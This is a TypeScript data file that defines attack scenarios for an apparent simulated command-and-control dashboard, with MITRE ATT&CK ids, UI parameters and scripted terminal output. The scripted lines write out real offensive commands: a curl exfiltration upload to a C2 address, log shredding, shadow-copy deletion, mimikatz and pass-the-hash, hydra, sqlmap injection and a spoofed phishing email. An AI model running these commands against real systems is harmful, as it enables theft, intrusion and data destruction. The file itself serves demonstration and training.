// ═══════════════════════════════════════════════════════════
// Attack definitions — all attack types for the C2 page
// ═══════════════════════════════════════════════════════════

export type Severity = 'critical' | 'high' | 'medium';
export type AttackCategory = 'Intrusion' | 'Exfiltration' | 'Disruption' | 'Reconnaissance' | 'Persistence' | 'C2';

export interface ParamDef {
  key: string;
  label: string;
  type: 'slider' | 'select' | 'text' | 'time';
  options?: string[];
  min?: number;
  max?: number;
  default: string | number;
  unit?: string;
}

export interface AttackDef {
  id: string;
  name: string;
  mitre_id: string;
  mitre_tactic: string;
  severity: Severity;
  category: AttackCategory;
  color: string;
  icon: string;
  description: string;
  params: ParamDef[];
  // Real-attacker steps shown in the simulation terminal
  steps: string[];
}

export const ATTACK_DEFS: AttackDef[] = [
  // ── Reconnaissance ──────────────────────────────────────
  {
    id: 'port_scan',
    name: 'Port Scanning (Nmap)',
    mitre_id: 'T1046',
    mitre_tactic: 'Discovery',
    severity: 'medium',
    category: 'Reconnaissance',
    color: '#ffcc00',
    icon: '📡',
    description: 'Systematic scan of target hosts across port ranges to map open services.',
    params: [
      { key: 'port_range', label: 'Port Range', type: 'text', default: '1-65535' },
      { key: 'scan_speed', label: 'Scan Speed', type: 'select', options: ['Stealth (SYN)', 'Normal', 'Aggressive (-T4)', 'Insane (-T5)'], default: 'Aggressive (-T4)' },
      { key: 'os_detect',  label: 'OS Detection', type: 'select', options: ['Enabled', 'Disabled'], default: 'Enabled' },
    ],
    steps: [
      '> nmap -sS -O -T4 {target_ip} -p {port_range}',
      '> Starting Nmap 7.94 — host discovery...',
      '> [*] Host {target_ip} is UP (0.0012s latency)',
      '> Scanning ports {port_range}...',
      '> 22/tcp   OPEN  ssh     OpenSSH 8.9',
      '> 80/tcp   OPEN  http    nginx 1.24',
      '> 443/tcp  OPEN  https   TLSv1.3',
      '> 3389/tcp OPEN  ms-wbt-server',
      '> OS detection: {target_os}',
      '> [+] Scan complete — results saved to {target_ip}.xml',
    ],
  },

  // ── Credential Access ────────────────────────────────────
  {
    id: 'brute_force',
    name: 'Brute Force (SSH/RDP)',
    mitre_id: 'T1110.001',
    mitre_tactic: 'Credential Access',
    severity: 'high',
    category: 'Intrusion',
    color: '#ff6600',
    icon: '🔑',
    description: 'Rapid credential stuffing and dictionary attack against SSH/RDP services.',
    params: [
      { key: 'service',   label: 'Target Service', type: 'select', options: ['SSH (22)', 'RDP (3389)', 'SMB (445)', 'FTP (21)', 'Telnet (23)'], default: 'SSH (22)' },
      { key: 'wordlist',  label: 'Wordlist',        type: 'select', options: ['rockyou.txt (14M)', 'common-passwords.txt', 'custom.txt'], default: 'rockyou.txt (14M)' },
      { key: 'attempts',  label: 'Attempts',        type: 'slider', min: 50, max: 5000, default: 500 },
      { key: 'threads',   label: 'Threads',         type: 'slider', min: 1, max: 64, default: 16 },
    ],
    steps: [
      '> hydra -l root -P {wordlist} {target_ip} {service} -t {threads}',
      '> [DATA] max {threads} tasks per 1 server',
      '> [DATA] attacking {service}://{target_ip}',
      '> [ATTEMPT] target {target_ip} — login "admin" password "password"   [FAIL]',
      '> [ATTEMPT] target {target_ip} — login "admin" password "admin123"   [FAIL]',
      '> [ATTEMPT] target {target_ip} — login "root"  password "toor"       [FAIL]',
      '> [...] {attempts} attempts completed in 42s',
      '> [22][ssh] host: {target_ip}  login: {user}  password: {pass}  [SUCCESS]',
      '> [+] Valid credentials found — establishing session...',
    ],
  },

  // ── Impact ───────────────────────────────────────────────
  {
    id: 'ddos',
    name: 'DDoS Flood Attack',
    mitre_id: 'T1498.001',
    mitre_tactic: 'Impact',
    severity: 'critical',
    category: 'Disruption',
    color: '#ff3366',
    icon: '🌊',
    description: 'Volumetric DDoS flood — SYN/UDP/ICMP attack overwhelming target bandwidth.',
    params: [
      { key: 'attack_type', label: 'Flood Type',    type: 'select', options: ['SYN Flood', 'UDP Flood', 'ICMP Flood', 'HTTP GET Flood', 'Slowloris'], default: 'SYN Flood' },
      { key: 'bandwidth',   label: 'Traffic (Gbps)', type: 'slider', min: 1, max: 100, default: 40, unit: 'Gbps' },
      { key: 'duration',    label: 'Duration (sec)', type: 'slider', min: 10, max: 300, default: 60, unit: 's' },
      { key: 'botnet_size', label: 'Botnet Nodes',   type: 'slider', min: 100, max: 50000, default: 5000 },
    ],
    steps: [
      '> [*] Activating botnet — {botnet_size} nodes online',
      '> [*] Coordinating {attack_type} via C2 channel',
      '> [*] Target: {target_ip} | Bandwidth: {bandwidth} Gbps',
      '> [FLOOD] SYN packets: 4,200,000/sec → {target_ip}',
      '> [FLOOD] Packet loss on target: 12% → 67% → 94%',
      '> [FLOOD] Target response time: 2ms → 8s → TIMEOUT',
      '> [+] Target {target_ip} is DOWN — service unreachable',
      '> [*] Maintaining flood for {duration}s...',
    ],
  },

  // ── Initial Access ───────────────────────────────────────
  {
    id: 'sql_injection',
    name: 'SQL Injection',
    mitre_id: 'T1190',
    mitre_tactic: 'Initial Access',
    severity: 'critical',
    category: 'Intrusion',
    color: '#ff3366',
    icon: '💉',
    description: 'Blind/Union-based SQL injection to extract sensitive database records.',
    params: [
      { key: 'endpoint',  label: 'Target Endpoint', type: 'text', default: '/api/login' },
      { key: 'db_type',   label: 'Database',        type: 'select', options: ['MySQL', 'PostgreSQL', 'MSSQL', 'Oracle', 'SQLite'], default: 'PostgreSQL' },
      { key: 'technique', label: 'Technique',       type: 'select', options: ['Union-Based', 'Blind Boolean', 'Time-Based Blind', 'Error-Based'], default: 'Union-Based' },
    ],
    steps: [
      '> sqlmap -u "http://{target_ip}{endpoint}?id=1" --dbs --technique={technique}',
      '> [*] Testing connection to target...',
      '> [*] Parameter "id" appears to be injectable',
      '> [PAYLOAD] id=1\' OR 1=1--',
      '> [+] Backend DBMS identified: {db_type}',
      '> [*] Enumerating databases...',
      '> [+] Available databases: [information_schema, {db_name}, employees, logs]',
      '> [*] Dumping table: users...',
      '> [+] 847 records extracted — usernames, hashed passwords, emails',
      '> [*] Cracking hashes offline with hashcat...',
    ],
  },

  // ── Exfiltration ─────────────────────────────────────────
  {
    id: 'file_exfiltration',
    name: 'Data Exfiltration',
    mitre_id: 'T1041',
    mitre_tactic: 'Exfiltration',
    severity: 'critical',
    category: 'Exfiltration',
    color: '#ff3366',
    icon: '📤',
    description: 'Staged data theft — compress, encrypt, and exfiltrate sensitive files to attacker C2.',
    params: [
      { key: 'file_size_mb', label: 'Data Volume (MB)', type: 'slider', min: 10, max: 5000, default: 600, unit: 'MB' },
      { key: 'destination',  label: 'C2 Destination',   type: 'text',   default: '185.220.101.34:443' },
      { key: 'protocol',     label: 'Protocol',         type: 'select', options: ['HTTPS (443)', 'DNS Tunnel', 'ICMP Covert', 'SMB'], default: 'HTTPS (443)' },
    ],
    steps: [
      '> [*] Establishing encrypted channel to {destination}',
      '> [*] Staging sensitive files for exfiltration...',
      '> find / -name "*.xlsx" -o -name "*.pdf" -o -name "*.docx" 2>/dev/null',
      '> [*] {file_size_mb}MB staged — compressing with 7zip (AES-256)',
      '> [*] Splitting into 16MB chunks for covert transfer',
      '> curl -k --data-binary @chunk_01.7z https://{destination}/upload',
      '> [TRANSFER] Chunk 1/8  ████████░░░░  62% — 9.8 MB/s',
      '> [TRANSFER] Chunk 8/8  ████████████ 100% — transfer complete',
      '> [+] {file_size_mb}MB exfiltrated — cleaning up artefacts...',
      '> shred -u /tmp/staged_* && history -c',
    ],
  },

  // ── Lateral Movement ────────────────────────────────────
  {
    id: 'lateral_movement',
    name: 'Lateral Movement (PtH)',
    mitre_id: 'T1550.002',
    mitre_tactic: 'Lateral Movement',
    severity: 'high',
    category: 'Intrusion',
    color: '#ff6600',
    icon: '↔️',
    description: 'Pass-the-Hash — use NTLM hash of compromised account to pivot across the network.',
    params: [
      { key: 'target_subnet', label: 'Target Subnet', type: 'text',   default: '10.0.0.0/24' },
      { key: 'account',       label: 'Compromised Account', type: 'text', default: 'CORP\\svc_backup' },
    ],
    steps: [
      '> mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"',
      '> [+] NTLM Hash extracted: {ntlm_hash}',
      '> [*] Scanning subnet {target_subnet} for SMB...',
      '> crackmapexec smb {target_subnet} -u {account} -H {ntlm_hash}',
      '> SMB  {target_ip}  [+] {account} (Pwn3d!)',
      '> [*] Executing payload via psexec on {target_ip}...',
      '> [+] Reverse shell spawned: {target_ip}:4444 ← attacker:8080',
      '> [*] Pivoting to next target...',
    ],
  },



  // ── Ransomware ───────────────────────────────────────────
  {
    id: 'ransomware',
    name: 'Ransomware Deploy',
    mitre_id: 'T1486',
    mitre_tactic: 'Impact',
    severity: 'critical',
    category: 'Disruption',
    color: '#ff3366',
    icon: '🔒',
    description: 'Deploy ransomware payload to encrypt files and demand ransom — simulated only.',
    params: [
      { key: 'variant',    label: 'Ransomware Variant', type: 'select', options: ['LockBit 3.0 (sim)', 'ALPHV/BlackCat (sim)', 'Cl0p (sim)', 'Generic (sim)'], default: 'LockBit 3.0 (sim)' },
      { key: 'extensions', label: 'Target Extensions',  type: 'text',   default: '*.docx,*.xlsx,*.pdf,*.db' },
    ],
    steps: [
      '> [*] Deploying {variant} payload to {target_ip}',
      '> [*] Disabling backup services: vssadmin delete shadows /all /quiet',
      '> [*] Killing antivirus processes...',
      '> [*] Scanning for files matching: {extensions}',
      '> [ENCRYPT] 2,847 files encrypted with AES-256-CBC',
      '> [*] Dropping ransom note: @READ_ME_NOW.txt',
      '> [*] Exfiltrating 4.2GB before encryption (double-extortion)',
      '> [+] Encryption complete — {target_ip} is LOCKED',
    ],
  },

  // ── Phishing ─────────────────────────────────────────────
  {
    id: 'phishing',
    name: 'Spear Phishing',
    mitre_id: 'T1566.001',
    mitre_tactic: 'Initial Access',
    severity: 'high',
    category: 'Intrusion',
    color: '#ff6600',
    icon: '🎣',
    description: 'Crafted spear-phishing email with malicious macro attachment targeting specific user.',
    params: [
      { key: 'template', label: 'Lure Template', type: 'select', options: ['Invoice PDF', 'HR Policy Update', 'IT Password Reset', 'LinkedIn Connection', 'Parcel Delivery'], default: 'IT Password Reset' },
      { key: 'payload',  label: 'Payload Type',  type: 'select', options: ['Macro VBA', 'ISO+LNK', 'HTML Smuggling', 'QR Code'], default: 'Macro VBA' },
    ],
    steps: [
      '> [*] Crafting lure email: "{template}"',
      '> [*] Embedding {payload} payload in attachment',
      '> swaks --to {target_email} --from it-support@corp-helpdesk.com \\',
      '>       --attach malicious.docx --header "Subject: URGENT: {template}"',
      '> [+] Email delivered to {target_ip} mail server',
      '> [*] Waiting for victim interaction...',
      '> [+] Macro executed on {target_ip} — beacon received!',
      '> [*] Meterpreter session opened: {target_ip}:52134 → attacker:443',
    ],
  },
];
